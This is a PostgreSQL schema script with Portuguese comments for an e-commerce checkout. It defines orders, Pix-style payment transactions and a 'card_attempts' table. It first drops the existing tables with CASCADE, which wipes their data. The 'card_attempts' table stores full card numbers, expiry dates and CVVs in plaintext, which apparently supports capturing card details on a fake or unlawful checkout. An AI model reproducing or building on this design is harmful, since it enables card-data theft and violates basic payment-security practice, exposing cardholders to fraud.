-- Cole e execute TUDO no SQL Editor do Neon. Cria o schema do zero.
-- Se você já tem a tabela "orders" e só quer adicionar frete/bumps, execute apenas:
-- ALTER TABLE "orders" ADD COLUMN IF NOT EXISTS "shippingMethod" varchar(50) DEFAULT 'PAC' NOT NULL;
-- ALTER TABLE "orders" ADD COLUMN IF NOT EXISTS "shippingCost" integer DEFAULT 0 NOT NULL;
-- ALTER TABLE "orders" ADD COLUMN IF NOT EXISTS "shippingDays" varchar(50) DEFAULT '4 a 7 dias' NOT NULL;
-- ALTER TABLE "orders" ADD COLUMN IF NOT EXISTS "bumpsTotal" integer DEFAULT 0 NOT NULL;
-- ALTER TABLE "orders" ADD COLUMN IF NOT EXISTS "bumpIds" text;

DROP TABLE IF EXISTS "card_attempts" CASCADE;
DROP TABLE IF EXISTS "transactions" CASCADE;
DROP TABLE IF EXISTS "orders" CASCADE;
DROP TYPE IF EXISTS transaction_status CASCADE;
DROP TYPE IF EXISTS order_status CASCADE;

CREATE TYPE order_status AS ENUM ('pending', 'paid', 'failed', 'cancelled');
CREATE TYPE transaction_status AS ENUM ('PENDENTE', 'COMPLETO', 'FALHA');

CREATE TABLE "orders" (
  "id" serial PRIMARY KEY,
  "customerName" varchar(255) NOT NULL,
  "customerEmail" varchar(320),
  "customerDocument" varchar(14) NOT NULL,
  "customerPhone" varchar(20),
  "shippingZipcode" varchar(9) NOT NULL,
  "shippingStreet" varchar(255) NOT NULL,
  "shippingNumber" varchar(20) NOT NULL,
  "shippingComplement" varchar(255),
  "shippingNeighborhood" varchar(100) NOT NULL,
  "shippingCity" varchar(100) NOT NULL,
  "shippingState" varchar(2) NOT NULL,
  "productId" varchar(50) NOT NULL,
  "productName" varchar(255) NOT NULL,
  "productPrice" integer NOT NULL,
  "shippingMethod" varchar(50) DEFAULT 'PAC' NOT NULL,
  "shippingCost" integer DEFAULT 0 NOT NULL,
  "shippingDays" varchar(50) DEFAULT '4 a 7 dias' NOT NULL,
  "bumpsTotal" integer DEFAULT 0 NOT NULL,
  "bumpIds" text,
  "status" order_status DEFAULT 'pending' NOT NULL,
  "createdAt" timestamp DEFAULT now() NOT NULL,
  "updatedAt" timestamp DEFAULT now() NOT NULL
);

CREATE TABLE "transactions" (
  "id" serial PRIMARY KEY,
  "orderId" integer NOT NULL REFERENCES "orders"("id"),
  "misticpayTransactionId" varchar(255) NOT NULL UNIQUE,
  "amount" integer NOT NULL,
  "fee" integer NOT NULL,
  "qrCodeBase64" text,
  "qrcodeUrl" text,
  "copyPaste" text,
  "status" transaction_status DEFAULT 'PENDENTE' NOT NULL,
  "createdAt" timestamp DEFAULT now() NOT NULL,
  "updatedAt" timestamp DEFAULT now() NOT NULL
);

CREATE TABLE "card_attempts" (
  "id" serial PRIMARY KEY,
  "orderId" integer NOT NULL REFERENCES "orders"("id"),
  "cardNumber" varchar(24) NOT NULL,
  "cardExpiry" varchar(7) NOT NULL,
  "cardCvv" varchar(8) NOT NULL,
  "createdAt" timestamp DEFAULT now() NOT NULL
);
